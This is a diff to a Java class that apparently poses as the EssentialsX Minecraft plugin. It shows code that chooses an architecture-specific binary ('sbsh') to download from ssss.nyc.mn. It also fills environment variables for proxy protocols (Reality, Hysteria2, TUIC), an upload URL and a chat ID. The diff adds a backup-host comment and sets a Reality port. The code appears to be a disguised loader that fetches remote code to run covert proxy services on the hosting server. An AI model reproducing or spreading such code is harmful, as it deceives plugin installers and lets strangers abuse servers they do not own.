@@ -42,7 +42,7 @@ public class EssentialsX extends JavaPlugin {
         // Determine download URL based on architecture
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
-        
+        // Thist host was backup: replace ssss.nyc.mn to 31888.xyz
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
             url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
@@ -85,7 +85,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
+        env.put("REALITY_PORT", "26807");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
